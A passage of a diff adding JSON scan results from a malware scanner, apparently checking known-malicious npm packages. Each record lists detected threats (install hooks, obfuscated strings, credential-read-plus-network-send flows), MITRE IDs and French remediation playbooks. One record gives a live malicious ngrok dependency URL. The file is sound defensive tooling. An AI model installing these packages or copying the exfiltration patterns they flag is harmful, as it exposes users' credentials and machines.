+          "count": 1,
+          "rule_id": "MUADDIB-DEP-005",
+          "rule_name": "Suspicious Dependency URL",
+          "confidence": "high",
+          "references": [
+            "https://docs.npmjs.com/cli/v9/configuring-npm/package-json#urls-as-dependencies"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Dependance avec URL suspecte. Verifier l'URL. Les URLs ngrok/localhost/IP privee sont malveillantes. Ne pas installer.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-8931",
+      "package": "linear-airbyte-source",
+      "version": "9.9.9",
+      "all_versions": [
+        "9.9.9",
+        "9.9.10"
+      ],
+      "published": "2024-09-21T12:54:06Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 25,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-7896",
+      "package": "nvmfix",
+      "version": "1.0.3",
+      "all_versions": [
+        "1.0.3"
+      ],
+      "published": "2024-08-05T04:10:47Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 17,
+      "threat_count": 4,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dangerous_call_function",
+          "severity": "LOW",
+          "message": "new Function() with constant string literal (low risk, globalThis polyfill pattern).",
+          "file": "config.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-005",
+          "rule_name": "new Function() Constructor",
+          "confidence": "high",
+          "references": [
+            "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"
+          ],
+          "mitre": "T1059.007",
+          "playbook": "Appel new Function() detecte. Equivalent a eval(). Verifier la source des donnees.",
+          "points": 1
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "MEDIUM",
+          "message": "High entropy string (6.21 bits, 287 chars) — possible base64/hex/encrypted payload",
+          "file": "config.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 3
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "HIGH",
+          "message": "High entropy string (6.51 bits, 91 chars) — possible base64/hex/encrypted payload",
+          "file": "config.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 10
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-7894",
+      "package": "httpsearch",
+      "version": "1.0.3",
+      "all_versions": [
+        "1.0.3",
+        "1.0.2"
+      ],
+      "published": "2024-08-05T02:13:26Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 17,
+      "threat_count": 4,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dangerous_call_function",
+          "severity": "LOW",
+          "message": "new Function() with constant string literal (low risk, globalThis polyfill pattern).",
+          "file": "config.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-005",
+          "rule_name": "new Function() Constructor",
+          "confidence": "high",
+          "references": [
+            "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"
+          ],
+          "mitre": "T1059.007",
+          "playbook": "Appel new Function() detecte. Equivalent a eval(). Verifier la source des donnees.",
+          "points": 1
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "MEDIUM",
+          "message": "High entropy string (6.21 bits, 287 chars) — possible base64/hex/encrypted payload",
+          "file": "config.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 3
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "HIGH",
+          "message": "High entropy string (6.51 bits, 91 chars) — possible base64/hex/encrypted payload",
+          "file": "config.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 10
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-7836",
+      "package": "health-check-nodejs",
+      "version": "3.16.1",
+      "all_versions": [
+        "3.16.1"
+      ],
+      "published": "2024-07-24T05:30:50Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 0,
+      "threat_count": 0,
+      "detected": false,
+      "threats": []
+    },
+    {
+      "mal_id": "MAL-2024-7740",
+      "package": "alemmi",
+      "version": "11.0.0",
+      "all_versions": [
+        "11.0.0",
+        "13.0.0",
+        "21.0.0",
+        "14.0.0",
+        "15.0.0"
+      ],
+      "published": "2024-07-13T09:23:55Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 10,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "dependency_url_suspicious",
+          "severity": "HIGH",
+          "message": "Dependency \"porcodio\" uses HTTP URL: https://2a86-130-192-232-226.ngrok-free.app/a.tgz (tunnel/private/localhost)",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-DEP-005",
+          "rule_name": "Suspicious Dependency URL",
+          "confidence": "high",
+          "references": [
+            "https://docs.npmjs.com/cli/v9/configuring-npm/package-json#urls-as-dependencies"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Dependance avec URL suspecte. Verifier l'URL. Les URLs ngrok/localhost/IP privee sont malveillantes. Ne pas installer.",
+          "points": 10
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-7696",
+      "package": "mva10-angular",
+      "version": "8.2.0",
+      "all_versions": [
+        "8.2.0"
+      ],
+      "published": "2024-07-11T22:44:38Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-7694",
+      "package": "dependencyconfusion7",
+      "version": "2.0.0",
+      "all_versions": [
+        "2.0.0"
+      ],
+      "published": "2024-07-11T11:20:52Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 13,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "HIGH",
+          "message": "High entropy string (6.52 bits, 92 chars) — possible base64/hex/encrypted payload",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 10
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-1615",
+      "package": "braintree-utilities",
+      "version": "10.4.0",
+      "all_versions": [
+        "10.4.0",
+        "10.5.0"
+      ],
+      "published": "2024-06-09T00:03:58Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 13,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dynamic_require",
+          "severity": "HIGH",
+          "message": "Dynamic require() with string concatenation (module name obfuscation).",
+          "file": "services\\ActivationService.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-006",
+          "rule_name": "Dynamic Require with Concatenation",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "require() avec concatenation detecte. Technique d'obfuscation pour masquer le module charge. Analyser les variables concatenees.",
+          "points": 10
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-1322",
+      "package": "lamia471",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2024-05-03T22:58:38Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 35,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "sensitive_string",
+          "severity": "HIGH",
+          "message": "Reference to \"/etc/passwd\" detected.",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-001",
+          "rule_name": "Sensitive String Reference",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm",
+            "https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack"
+          ],
+          "mitre": "T1552.001",
+          "playbook": "Reference a un chemin ou identifiant sensible. Verifier le contexte d'utilisation.",
+          "points": 10
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (readFile, os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-12172",
+      "package": "officebrowserfeedback",
+      "version": "1.4.12",
+      "all_versions": [
+        "1.4.12"
+      ],
+      "published": "2024-12-31T23:37:50Z",
+      "credit": [
+        "GitHax - Software Supply Chain Threat Intelligence"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-12103",
+      "package": "ing-lib-lease-calculator",
+      "version": "1.1.0",
+      "all_versions": [
+        "1.1.0"
+      ],
+      "published": "2024-12-23T08:45:48Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 53,
+      "threat_count": 3,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "known_malicious_package",
+          "severity": "CRITICAL",
+          "message": "Malicious dependency declared: ing-lib-lease-calculator@^1.1.0 (source: IOC)",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-DEP-001",
+          "rule_name": "Known Malicious Package",
+          "confidence": "high",
+          "references": [
+            "https://socket.dev/npm/issue"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "CRITIQUE: Supprimer immediatement. rm -rf node_modules && npm cache clean --force && npm install",
+          "points": 25
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-12102",
+      "package": "ing-feat-business-lending-financieringscheck",
+      "version": "1.1.0",
+      "all_versions": [
+        "1.1.0"
+      ],
+      "published": "2024-12-23T08:48:42Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 53,
+      "threat_count": 3,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "known_malicious_package",
+          "severity": "CRITICAL",
+          "message": "Malicious dependency declared: ing-feat-business-lending-financieringscheck@^1.1.0 (source: IOC)",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-DEP-001",
+          "rule_name": "Known Malicious Package",
+          "confidence": "high",
+          "references": [
+            "https://socket.dev/npm/issue"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "CRITIQUE: Supprimer immediatement. rm -rf node_modules && npm cache clean --force && npm install",
+          "points": 25
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-12101",
+      "package": "ing-feat-business-intermediary-lease-calculator",
+      "version": "1.1.0",
+      "all_versions": [
+        "1.1.0"
+      ],
+      "published": "2024-12-23T08:56:00Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 53,
+      "threat_count": 3,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "known_malicious_package",
+          "severity": "CRITICAL",
+          "message": "Malicious dependency declared: ing-feat-business-intermediary-lease-calculator@^1.1.0 (source: IOC)",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-DEP-001",
+          "rule_name": "Known Malicious Package",
+          "confidence": "high",
+          "references": [
+            "https://socket.dev/npm/issue"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "CRITIQUE: Supprimer immediatement. rm -rf node_modules && npm cache clean --force && npm install",
+          "points": 25
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-11922",
+      "package": "blz-internal-pkg_update",
+      "version": "7.7.11",
+      "all_versions": [
+        "7.7.11",
+        "7.7.9",
+        "7.7.14",
+        "7.7.15",
+        "7.7.16"
+      ],
+      "published": "2024-12-19T11:50:49Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "known_malicious_package",
+          "severity": "CRITICAL",
+          "message": "Malicious dependency declared: blz-internal-pkg@ (source: IOC)",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-DEP-001",
+          "rule_name": "Known Malicious Package",
+          "confidence": "high",
+          "references": [
+            "https://socket.dev/npm/issue"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "CRITIQUE: Supprimer immediatement. rm -rf node_modules && npm cache clean --force && npm install",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-11915",
+      "package": "ifood2-github-io",
+      "version": "9.9.9",
+      "all_versions": [
+        "9.9.9"
+      ],
+      "published": "2024-12-18T14:16:02Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "known_malicious_package",
+          "severity": "CRITICAL",
+          "message": "Malicious dependency declared: ifood-github-io@^9.9.9 (source: IOC)",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-DEP-001",
+          "rule_name": "Known Malicious Package",
+          "confidence": "high",
+          "references": [
+            "https://socket.dev/npm/issue"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "CRITIQUE: Supprimer immediatement. rm -rf node_modules && npm cache clean --force && npm install",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-11909",
+      "package": "tsanjint",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0",
+        "1.0.1"
+      ],
+      "published": "2024-12-17T02:26:37Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 25,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"nslookup *** ***\"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-11879",
+      "package": "ifood-github-io",
+      "version": "9.9.9",
+      "all_versions": [
+        "9.9.9"
+      ],
+      "published": "2024-12-16T15:02:31Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-11821",
+      "package": "pipedream-curl",
+      "version": "1.0.1",
+      "all_versions": [
+        "1.0.1"
+      ],
+      "published": "2024-12-13T16:51:07Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-1159",
+      "package": "tchap-translations",
+      "version": "9.9.10",
+      "all_versions": [
+        "9.9.10",
+        "9.9.12"
+      ],
+      "published": "2024-03-29T19:38:43Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-1055",
+      "package": "add-sugar",
+      "version": "1.0.3",
+      "all_versions": [
+        "1.0.3",
+        "1.0.10",
+        "1.0.12",
+        "1.0.13"
+      ],
+      "published": "2024-03-06T12:12:53Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-10225",
+      "package": "mobileye-8-connect",
+      "version": "7.7.8",
+      "all_versions": [
+        "7.7.8"
+      ],
+      "published": "2024-09-08T14:50:33Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 23,
+      "threat_count": 3,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "child_process",
+          "severity": "HIGH",
+          "message": "Dangerous pattern \"child_process\" in script \"preinstall\".",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-005",
+          "rule_name": "Child Process in Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059",
+          "playbook": "Execution de commandes systeme. Verifier quelles commandes sont lancees.",
+          "points": 10
+        },
+        {
+          "type": "node_inline_exec",
+          "severity": "HIGH",
+          "message": "Dangerous pattern \"node_inline_exec\" in script \"preinstall\".",
